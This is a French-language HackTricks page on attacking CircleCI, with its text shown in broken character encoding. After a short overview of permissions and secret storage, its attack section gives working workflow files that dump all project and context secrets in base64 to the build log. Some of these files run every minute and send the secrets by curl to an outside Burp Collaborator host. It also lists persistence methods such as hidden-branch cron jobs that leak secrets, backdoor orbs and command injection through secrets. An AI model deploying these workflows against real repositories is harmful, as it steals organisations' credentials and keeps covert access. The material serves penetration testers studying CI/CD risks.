# S√©curit√© CircleCI

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) est une plateforme d'Int√©gration Continue o√π vous pouvez **d√©finir des mod√®les** indiquant ce que vous voulez qu'elle fasse avec du code et quand le faire. De cette mani√®re, vous pouvez **automatiser les tests** ou les **d√©ploiements** directement **depuis la branche master de votre d√©p√¥t** par exemple.

## Permissions

**CircleCI** **h√©rite des permissions** de github et bitbucket li√©es au **compte** qui se connecte.\
Dans mes tests, j'ai v√©rifi√© que tant que vous avez des **permissions d'√©criture sur le d√©p√¥t dans github**, vous allez pouvoir **g√©rer les param√®tres de son projet dans CircleCI** (d√©finir de nouvelles cl√©s ssh, obtenir des cl√©s d'api de projet, cr√©er de nouvelles branches avec de nouvelles configurations CircleCI...).

Cependant, vous devez √™tre un **administrateur du d√©p√¥t** pour pouvoir **convertir le d√©p√¥t en projet CircleCI**.

## Variables d'environnement & Secrets

Selon [**la documentation**](https://circleci.com/docs/2.0/env-vars/), il existe diff√©rentes mani√®res de **charger des valeurs dans des variables d'environnement** √† l'int√©rieur d'un workflow.

### Variables d'environnement int√©gr√©es

Chaque conteneur ex√©cut√© par CircleCI aura toujours [**des variables d'environnement sp√©cifiques d√©finies dans la documentation**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) comme `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` ou `CIRCLE_USERNAME`.

### En clair

Vous pouvez les d√©clarer en clair √† l'int√©rieur d'une **commande** :
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Vous pouvez les d√©clarer en texte clair √† l'int√©rieur de l'**environnement d'ex√©cution** :
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Vous pouvez les d√©clarer en texte clair √† l'int√©rieur de l'**environnement du build-job** :
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Vous pouvez les d√©clarer en texte clair √† l'int√©rieur de **l'environnement d'un conteneur** :
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Secrets de Projet

Ce sont des **secrets** qui seront uniquement **accessibles** par le **projet** (par **n'importe quelle branche**).\
Vous pouvez les voir **d√©clar√©s dans** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
La fonctionnalit√© "**Importer les Variables**" permet d'**importer des variables d'autres projets** dans celui-ci.
{% endhint %}

### Secrets de Contexte

Ce sont des secrets qui sont **√† l'√©chelle de l'organisation**. Par **d√©faut, n'importe quel d√©p√¥t** pourra **acc√©der √† n'importe quel secret** stock√© ici :

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
Cependant, notez qu'un groupe diff√©rent (au lieu de Tous les membres) peut √™tre **s√©lectionn√© pour donner acc√®s aux secrets uniquement √† certaines personnes**.\
C'est actuellement l'une des meilleures fa√ßons d'**augmenter la s√©curit√© des secrets**, pour ne pas permettre √† tout le monde d'y acc√©der, mais seulement √† certaines personnes.
{% endhint %}

## Attaques

### Recherche de Secrets en Clair

Si vous avez **acc√®s au VCS** (comme github), v√©rifiez le fichier `.circleci/config.yml` de **chaque d√©p√¥t sur chaque branche** et **cherchez** d'√©ventuels **secrets en clair** stock√©s l√†-bas.

### √ânum√©ration des Variables d'Environnement Secr√®tes & Contexte

En v√©rifiant le code, vous pouvez trouver **tous les noms de secrets** qui sont **utilis√©s** dans chaque fichier `.circleci/config.yml`. Vous pouvez √©galement obtenir **les noms de contexte** √† partir de ces fichiers ou les v√©rifier dans la console web : _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Exfiltration des Secrets de Projet

{% hint style="warning" %}
Pour **exfiltrer TOUS** les secrets de projet et de contexte, vous avez **juste** besoin d'avoir un acc√®s **√âCRITURE** √† **un seul d√©p√¥t** dans toute l'organisation github (_et votre compte doit avoir acc√®s aux contextes mais par d√©faut tout le monde peut acc√©der √† chaque contexte_).
{% endhint %}

{% hint style="danger" %}
La fonctionnalit√© "**Importer les Variables**" permet d'**importer des variables d'autres projets** dans celui-ci. Par cons√©quent, un attaquant pourrait **importer toutes les variables de projet de tous les d√©p√¥ts** puis **exfiltrer toutes ensemble**.
{% endhint %}

Tous les secrets de projet sont toujours d√©finis dans l'environnement des jobs, donc juste en appelant env et en l'obscurcissant en base64 permettra d'exfiltrer les secrets dans la **console de log web des workflows** :
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Si vous **n'avez pas acc√®s √† la console web** mais que vous avez **acc√®s au d√©p√¥t** et que vous savez que CircleCI est utilis√©, vous pouvez simplement **cr√©er un workflow** qui est **d√©clench√© toutes les minutes** et qui **exfiltre les secrets vers une adresse externe** :
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Exfiltrer les secrets de Context

Vous devez **sp√©cifier le nom du contexte** (cela exfiltrera √©galement les secrets du projet) :
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Si vous **n'avez pas acc√®s √† la console web** mais que vous avez **acc√®s au d√©p√¥t** et que vous savez que CircleCI est utilis√©, vous pouvez simplement **modifier un workflow** qui est **d√©clench√© toutes les minutes** et qui **exfiltre les secrets vers une adresse externe** :
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Cr√©er un nouveau `.circleci/config.yml` dans un d√©p√¥t **n'est pas suffisant pour d√©clencher une construction circleci**. Vous devez **l'activer en tant que projet dans la console circleci**.
{% endhint %}

### √âvasion vers le Cloud

**CircleCI** vous donne l'option d'ex√©cuter **vos constructions sur leurs machines ou sur les v√¥tres**.\
Par d√©faut, leurs machines sont situ√©es dans GCP, et initialement, vous ne pourrez probablement rien trouver de pertinent. Cependant, si une victime ex√©cute les t√¢ches sur **ses propres machines (potentiellement, dans un environnement cloud)**, vous pourriez trouver un **point de terminaison de m√©tadonn√©es cloud avec des informations int√©ressantes**.

Remarquez que dans les exemples pr√©c√©dents, tout √©tait lanc√© √† l'int√©rieur d'un conteneur docker, mais vous pouvez aussi **demander √† lancer une machine VM** (qui peut avoir des permissions cloud diff√©rentes) :
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Ou m√™me un conteneur docker avec acc√®s √† un service docker distant :
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Persistance

* Il est possible de **cr√©er des jetons utilisateur dans CircleCI** pour acc√©der aux points de terminaison de l'API avec l'acc√®s des utilisateurs.
* _https://app.circleci.com/settings/user/tokens_
* Il est possible de **cr√©er des jetons de projets** pour acc√©der au projet avec les permissions donn√©es au jeton.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Il est possible d'**ajouter des cl√©s SSH** aux projets.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Il est possible de **cr√©er une t√¢che cron dans une branche cach√©e** dans un projet inattendu qui **fuite** toutes les variables d'**environnement de contexte** tous les jours.
* Ou m√™me cr√©er dans une branche / modifier un travail connu qui va **fuite** tous les secrets de contexte et de **projets** tous les jours.
* Si vous √™tes propri√©taire sur github, vous pouvez **autoriser des orbs non v√©rifi√©s** et en configurer un dans un travail comme **porte d√©rob√©e**
* Vous pouvez trouver une **vuln√©rabilit√© d'injection de commande** dans une t√¢che et **injecter des commandes** via un **secret** en modifiant sa valeur

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
